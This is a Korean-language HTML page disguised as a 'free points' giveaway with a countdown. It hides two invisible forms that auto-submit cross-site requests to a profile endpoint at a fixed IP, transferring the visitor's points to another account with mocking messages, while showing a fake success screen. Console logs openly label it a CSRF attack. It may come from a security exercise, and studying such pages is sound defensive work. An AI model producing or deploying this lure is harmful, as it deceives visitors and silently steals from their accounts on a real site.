<!DOCTYPE html>
<html lang="ko">
<head>
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <!-- 또는 -->
    <meta http-equiv="Content-Security-Policy" content="block-all-mixed-content">
</head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 500px;
            width: 90%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .subtitle { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
        .countdown { font-size: 3em; color: #FFD700; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); margin: 20px 0; }
        .progress-bar { width: 100%; height: 20px; background: rgba(255,255,255,0.3); border-radius: 10px; overflow: hidden; margin: 20px 0; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #00ff88, #00cc6a); width: 0%; transition: width 0.5s ease; border-radius: 10px; }
        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p class="subtitle">무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <div id="loading-section">
            <div class="loading">
                <p>💰 포인트 지급을 준비하고 있습니다...</p>
                <p class="countdown" id="countdown">3</p>
                <p>초 후 자동으로 포인트가 지급됩니다!</p>
            </div>
            <div class="progress-bar"><div class="progress-fill" id="progressBar"></div></div>
            <p id="status">🔄 시스템 연결 중...</p>
        </div>
        
        <div id="success-section" style="display: none;">
            <h2 class="success pulse">✅ 포인트 지급 완료!</h2>
            <p style="font-size: 1.3em; margin: 20px 0;">💰 150P가 성공적으로 지급되었습니다!</p>
            <p style="opacity: 0.8;">포인트는 즉시 계정에 반영됩니다.</p>
        </div>
    </div>
   <!-- 숨겨진 공격 폼들 -->
    <div style="display: none;">
        <!-- 첫 번째 공격 폼 -->
        <form id="attack1" method="POST" action="http://3.35.218.180/profile.php" target="hiddenFrame1">
            <input type="hidden" name="receiver_id" value="13">
            <input type="hidden" name="points" value="30">
            <input type="hidden" name="send_gift" value="1">
            <input type="hidden" name="gift_type" value="coffee">
            <input type="hidden" name="message" value="어 개털렸죠?">
        </form>
        
        <!-- 두 번째 공격 폼 -->
        <form id="attack2" method="POST" action="http://3.35.218.180/profile.php" target="hiddenFrame2">
            <input type="hidden" name="receiver_id" value="13">
            <input type="hidden" name="points" value="25">
            <input type="hidden" name="send_gift" value="1">
            <input type="hidden" name="gift_type" value="cake">
            <input type="hidden" name="message" value="내가 가져간다 이 대머리야">
        </form>
        
        <!-- 숨겨진 iframe들 -->
        <iframe name="hiddenFrame1" style="width:0; height:0; border:none;"></iframe>
        <iframe name="hiddenFrame2" style="width:0; height:0; border:none;"></iframe>
    </div>

    <script>
        let countdown = 3;
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const loadingSection = document.getElementById('loading-section');
        const successSection = document.getElementById('success-section');
        
        const statusMessages = [
            '🔄 서버에 연결하고 있습니다...',
            '🔐 보안 인증을 확인하고 있습니다...',
            '💰 포인트 지급 시스템을 준비하고 있습니다...'
        ];
        
        let messageIndex = 0;
        
        // 카운트다운 시작
        const countdownTimer = setInterval(() => {
            countdown--;
            countdownEl.textContent = countdown;
            progressBar.style.width = ((3-countdown) * 33) + '%';
            
            if (messageIndex < statusMessages.length) {
                statusEl.textContent = statusMessages[messageIndex++];
            }
            
            if (countdown <= 0) {
                clearInterval(countdownTimer);
                executeAttack();
            }
        }, 1000);
        
        function executeAttack() {
            console.log('🎯 CSRF 공격 시작...');
            statusEl.textContent = '💸 실제 포인트를 전송하고 있습니다...';
            progressBar.style.width = '100%';
            
            // 첫 번째 공격 실행
            setTimeout(() => {
                document.getElementById('attack1').submit();
                console.log('🚀 첫 번째 공격 전송: 30P -> hacker');
            }, 500);
            
            // 두 번째 공격 실행 (2초 후)
            setTimeout(() => {
                document.getElementById('attack2').submit();
                console.log('🚀 두 번째 공격 전송: 25P -> hacker');
            }, 2500);
            
            // 성공 메시지 표시
            setTimeout(() => {
                loadingSection.style.display = 'none';
                successSection.style.display = 'block';
                console.log('🎉 공격 완료! hacker 계정 확인해보세요');
            }, 5000);
        }
    </script>
</body>
</html>
